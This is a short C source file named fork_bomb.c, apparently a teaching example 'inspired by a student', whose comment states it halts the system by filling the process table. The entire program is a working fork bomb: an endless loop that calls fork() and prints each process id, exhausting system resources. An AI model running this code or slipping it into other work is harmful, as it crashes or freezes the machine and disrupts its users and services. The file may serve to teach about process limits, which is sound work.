/**
 * fork_bomb.c
 * 
 * Inspired by a student, this program will halt the system
 * by filling the process table.
 */

#include <stdio.h>
#include <stdlib.h>

int main(void){
	while (1) {
		fork();
		printf("%d: hi\n", getpid());
	}
}